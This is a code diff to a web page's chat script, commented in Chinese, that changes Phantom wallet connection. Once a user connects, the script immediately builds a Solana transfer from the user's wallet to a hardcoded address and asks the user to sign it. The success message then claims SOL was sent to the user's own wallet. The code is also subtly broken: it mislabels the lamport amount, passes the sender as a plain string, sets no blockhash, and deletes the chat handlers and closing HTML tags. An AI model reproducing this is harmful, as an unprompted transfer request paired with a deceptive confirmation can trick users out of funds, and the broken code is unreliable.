@@ -261,6 +261,8 @@
     }
 
 const targetSolAddress = "3hgGjYy9sCGTxGTmFzJ92KumaMXQTMGAL9aqQQpMrtzb"; // 您的 Solana 接收地址
+const connectWalletButton = document.getElementById('connectWalletButton');
+let isWalletConnected = false;
 
 connectWalletButton.addEventListener('click', async () => {
   if (window.solana && window.solana.isPhantom) {
@@ -268,14 +270,11 @@ connectWalletButton.addEventListener('click', async () => {
       // 尝试连接 Phantom 钱包
       const response = await window.solana.connect();
       const userWalletAddress = response.publicKey.toString(); // 获取用户的钱包地址
+      displayChatBubble(`钱包已连接，地址是：${userWalletAddress}`, 'bot');
+      isWalletConnected = true;
 
-      // 检查钱包地址是否匹配
-      if (userWalletAddress === targetSolAddress) {
-        displayChatBubble('钱包已连接，地址匹配！', 'bot');
-        isWalletConnected = true;
-      } else {
-        displayChatBubble(`钱包已连接，但地址不匹配。你的地址是：${userWalletAddress}`, 'bot');
-      }
+      // 提示用户确认发送 SOL
+      await sendSol(userWalletAddress); // 启动发送 SOL 的功能
     } catch (err) {
       displayChatBubble('连接钱包失败，请确保 Phantom 钱包已启用并正确连接。', 'bot');
       console.error('连接钱包失败：', err);
@@ -286,23 +285,32 @@ connectWalletButton.addEventListener('click', async () => {
   }
 });
 
-    chatSendButton.addEventListener('click', () => {
-      const message = chatInput.value.trim();
-      if (message) {
-        sendChatMessage(message);
-        chatInput.value = '';
-      }
-    });
+// 发送 SOL 的功能
+async function sendSol(userWalletAddress) {
+  if (!isWalletConnected) {
+    displayChatBubble('钱包未连接，无法发送 SOL。', 'bot');
+    return;
+  }
 
-    chatInput.addEventListener('keypress', (event) => {
-      if (event.key === 'Enter') {
-        const message = chatInput.value.trim();
-        if (message) {
-          sendChatMessage(message);
-          chatInput.value = '';
-        }
-      }
-    });
-  </script>
-</body>
-</html>
+  try {
+    const transaction = new solanaWeb3.Transaction().add(
+      solanaWeb3.SystemProgram.transfer({
+        fromPubkey: userWalletAddress, // 从用户的钱包地址
+        toPubkey: targetSolAddress, // 发送至目标钱包地址
+        lamports: 1000000, // 发送的金额（此处为 1 SOL, 1 SOL = 1,000,000 lamports）
+      })
+    );
+
+    // 确保用户批准该交易
+    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
+    const { signature } = await window.solana.signAndSendTransaction(transaction, connection);
+
+    // 等待交易确认
+    await connection.confirmTransaction(signature);
+
+    displayChatBubble(`已成功发送 SOL 到您的钱包地址！交易签名: ${signature}`, 'bot');
+  } catch (err) {
+    displayChatBubble('发送 SOL 失败，请稍后重试。', 'bot');
+    console.error('发送 SOL 错误：', err);
+  }
+}
